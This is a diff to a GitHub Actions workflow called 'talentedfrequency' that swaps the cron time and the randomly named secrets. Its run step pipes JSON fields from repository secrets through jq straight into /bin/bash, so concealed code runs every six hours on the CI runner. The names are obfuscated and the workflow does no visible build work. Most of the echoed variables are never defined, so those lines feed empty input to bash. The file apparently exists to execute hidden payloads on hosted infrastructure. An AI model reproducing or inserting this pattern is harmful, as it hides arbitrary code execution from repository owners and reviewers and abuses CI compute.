@@ -2,7 +2,7 @@ name: talentedfrequency
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 1/6 * * *'
+    - cron: '52 1/6 * * *'
 
 jobs:
   build:
@@ -11,18 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: talentedfrequency
         env:
-          md00861: ${{ secrets.md00861 }}
+          ztdmk5715: ${{ secrets.ztdmk5715 }}
         run: |
-          echo $md00861 | jq -r .vb2 | /bin/bash
-          echo $hbw638 | jq -r .alo4 | /bin/bash
-          echo $o974 | jq -r .hs1338 | /bin/bash
-          echo $mxvob94351 | jq -r .ny91170 | /bin/bash
-          echo $upyi1445 | jq -r .wh8 | /bin/bash
-          echo $xcsiz6 | jq -r .uk38 | /bin/bash
-          echo $ly634 | jq -r .x0129 | /bin/bash
-          echo $fop475 | jq -r .kor975 | /bin/bash
-          echo $w848 | jq -r .sfpsh58372 | /bin/bash
-          echo $vvtkk23 | jq -r .svzu327 | /bin/bash
-          echo $cmqr7 | jq -r .bxmwx99 | /bin/bash
-          echo $wdcg96 | jq -r .kq91 | /bin/bash
+          echo $ztdmk5715 | jq -r .y9 | /bin/bash
+          echo $hf97456 | jq -r .kknu33 | /bin/bash
+          echo $pja1 | jq -r .eq0464 | /bin/bash
+          echo $xg756 | jq -r .fcuq0763 | /bin/bash
+          echo $vltia0530 | jq -r .xtym334 | /bin/bash
+          echo $m45968 | jq -r .irmis5 | /bin/bash
+          echo $k772 | jq -r .zezly20572 | /bin/bash
+          echo $w32048 | jq -r .rl97660 | /bin/bash
 
